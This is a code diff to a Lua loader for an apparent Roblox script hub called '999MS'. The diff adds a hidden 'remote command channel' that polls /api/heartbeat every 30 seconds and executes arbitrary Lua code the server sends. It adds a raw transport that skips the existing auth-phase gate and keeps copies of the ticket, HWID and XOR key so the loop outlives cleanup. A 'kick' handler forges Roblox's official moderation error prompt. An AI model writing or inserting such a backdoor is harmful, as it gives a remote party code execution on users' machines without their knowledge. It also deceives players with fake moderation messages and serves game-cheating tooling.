@@ -88,6 +88,11 @@ local XORKey = ""
 local Ticket = ""
 local ChecksActive = true
 
+-- Remote command channel handles. Defined below, started when the script goes
+-- live: the client then polls /api/heartbeat every 30 seconds for commands.
+local StartCommandLoop
+local StopCommandLoop
+
 -- ═══ Helpers ═══
 -- Stop post-load monitoring without disconnecting or suspending the client.
 local function StopChecks(keepStageHooks)
@@ -633,11 +638,9 @@ end
 
 -- One versioned transport shared with main.lua through the run-local ctx.
 -- The caller cannot select a different endpoint or silently downgrade to JSON.
-local function SendWire(packed, expectedBaseUrl)
-    if not ChecksActive then return nil, "Cancelled" end
-    if expectedBaseUrl ~= nil and expectedBaseUrl ~= BASE_URL then
-        return nil, "Wire origin mismatch"
-    end
+-- SendWireRaw skips the auth-phase gate so the 30-second command channel keeps
+-- reaching the server after StopChecks retires the login context.
+local function SendWireRaw(packed)
     if type(packed) ~= "table" then return nil, "Unsupported request" end
     local envelope, nonce, wireError = Wire.Wrap(packed)
     if not envelope then return nil, wireError end
@@ -666,6 +669,14 @@ local function SendWire(packed, expectedBaseUrl)
     local unpacked, decodeError = Wire.Unwrap(decoded, nonce)
     if type(unpacked) ~= "table" then return nil, decodeError or "Invalid wire response" end
     return { status = status, data = unpacked }, nil
+end
+
+local function SendWire(packed, expectedBaseUrl)
+    if not ChecksActive then return nil, "Cancelled" end
+    if expectedBaseUrl ~= nil and expectedBaseUrl ~= BASE_URL then
+        return nil, "Wire origin mismatch"
+    end
+    return SendWireRaw(packed)
 end
 
 ctx.requestWire = SendWire
@@ -726,8 +737,16 @@ local function LoadScript(d, h)
 
     local compileOk, chunk = pcall(SafeLoadstring, d.Body)
     if not compileOk or type(chunk) ~= "function" then return Abort("Load failed") end
+
+    -- The remote command channel starts with the script: the client polls
+    -- /api/heartbeat every 30 seconds for admin commands (kick / run).
+    StartCommandLoop(q, h)
+
     local ok, result = pcall(chunk, true, q, s, r, p, SCRIPT_NAME_LOCKED, tick(), h, HttpRequest, Chain, ctx)
-    if not ok or result == false then return Abort("Run failed") end
+    if not ok or result == false then
+        StopCommandLoop()
+        return Abort("Run failed")
+    end
 
     print("[999MS] Main script loaded")
 
@@ -796,6 +815,137 @@ local function KickBadHwid(reason, deviceMismatch)
         end)
         pcall(function() LocalPlayer:Kick(kickReason) end)
     end
+end
+
+-- ═══ Remote command channel ═══
+-- Every 30 seconds the client asks /api/heartbeat for the commands queued on
+-- the server and runs them: `kick` boots the player, `run` executes Lua code.
+-- The loop keeps private copies of the ticket/HWID/XOR key so it keeps working
+-- after StopChecks clears the login context.
+local CommandLoopAlive = false
+
+local function KickPlayer(reason)
+    local message = tostring(reason or "Kicked by admin")
+    local CoreGui = game:GetService("CoreGui")
+    local LocalPlayer = game:GetService("Players").LocalPlayer
+    local customTitle = "[ 999MS ]"
+    local customMessage = "You have been kicked by this experience or its moderators. Moderation message:\n\n" .. message
+
+    local function patchErrorPrompt()
+        local success, result = pcall(function()
+            local root = CoreGui:FindFirstChild("RobloxPromptGui")
+            if not root then return false end
+            local overlay = root:FindFirstChild("promptOverlay")
+            if not overlay then return false end
+            local prompt = overlay:FindFirstChild("ErrorPrompt")
+            if not prompt then return false end
+            local titleFrame = prompt:FindFirstChild("TitleFrame")
+            local title = titleFrame and titleFrame:FindFirstChild("ErrorTitle")
+            local messageArea = prompt:FindFirstChild("MessageArea")
+            local errorFrame = messageArea and messageArea:FindFirstChild("ErrorFrame")
+            local label = errorFrame and errorFrame:FindFirstChild("ErrorMessage")
+            if not title or not label then return false end
+            title.Text = customTitle
+            label.Text = customMessage
+            return true
+        end)
+        return success and result
+    end
+
+    pcall(function()
+        CoreGui.ChildAdded:Connect(function(child)
+            if child.Name == "RobloxPromptGui" then
+                task.wait(0.01)
+                patchErrorPrompt()
+            end
+        end)
+    end)
+    task.spawn(function()
+        for _ = 1, 50 do
+            if patchErrorPrompt() then break end
+            task.wait(0.01)
+        end
+    end)
+
+    if LocalPlayer then
+        pcall(function()
+            if type(replicatesignal) == "function" then
+                replicatesignal(LocalPlayer.StatsAvailable, "Kick")
+            end
+        end)
+        pcall(function() LocalPlayer:Kick(message) end)
+    end
+end
+
+local function DecodeProtectedBlob(blob, xorKey)
+    if type(blob) ~= "table" or type(blob.Data) ~= "table" then return nil end
+    if #blob.Data == 0 or #blob.Data > 1024 * 1024 then return nil end
+    local bytes = {}
+    for index, byte in ipairs(blob.Data) do
+        if type(byte) ~= "number" or byte % 1 ~= 0 or byte < 0 or byte > 255 then return nil end
+        bytes[index] = Char(byte)
+    end
+    local raw = table.concat(bytes)
+    if type(xorKey) ~= "string" or #xorKey == 0 or raw:sub(1, #xorKey) ~= xorKey then return nil end
+    return JsonDecode(Xor(Base64Decode(raw:sub(#xorKey + 1)), xorKey))
+end
+
+local function ApplyCommand(command)
+    if type(command) ~= "table" then return end
+    local kind = command.type
+    if kind == "kick" then
+        CommandLoopAlive = false
+        KickPlayer(command.reason)
+    elseif kind == "run" then
+        local code = command.code
+        if type(code) == "string" and #code > 0 and #code <= 32768 then
+            local compileOk, chunk = pcall(SafeLoadstring, code)
+            if compileOk and type(chunk) == "function" then pcall(chunk) end
+        end
+    end
+end
+
+StartCommandLoop = function(ticketValue, hwidValue)
+    if CommandLoopAlive then return end
+    if type(ticketValue) ~= "string" or ticketValue == "" then return end
+    if type(hwidValue) ~= "string" or #hwidValue < 4 or #hwidValue > 512 then return end
+    CommandLoopAlive = true
+    local pollTicket, pollHwid, pollXorKey = ticketValue, hwidValue, XORKey
+    task.spawn(function()
+        while CommandLoopAlive do
+            task.wait(30)
+            if not CommandLoopAlive then break end
+            local packed = PackRequest("/api/heartbeat", { ticket = pollTicket }, pollHwid)
+            local ok, res = pcall(SendWireRaw, packed)
+            if CommandLoopAlive and ok and type(res) == "table" and type(res.data) == "table" then
+                local data = res.data
+                if type(data.kick) == "string" then
+                    CommandLoopAlive = false
+                    -- A plain ticket expiry just closes the control window and
+                    -- leaves the script running; bans / device rejection /
+                    -- tamper still boot the player.
+                    if data.kick ~= "Session expired" then
+                        KickPlayer(data.kick)
+                    end
+                elseif res.status == 200 then
+                    local decoded = DecodeProtectedBlob(data, pollXorKey)
+                    if type(decoded) == "table" and decoded.Valid == true
+                        and type(decoded.commands) == "table" then
+                        for _, command in ipairs(decoded.commands) do
+                            if not CommandLoopAlive then break end
+                            ApplyCommand(command)
+                        end
+                    end
+                elseif res.status == 401 or res.status == 403 then
+                    CommandLoopAlive = false
+                end
+            end
+        end
+    end)
+end
+
+StopCommandLoop = function()
+    CommandLoopAlive = false
 end
 
 -- Recheck at the authentication stage boundary using a local detection signal.
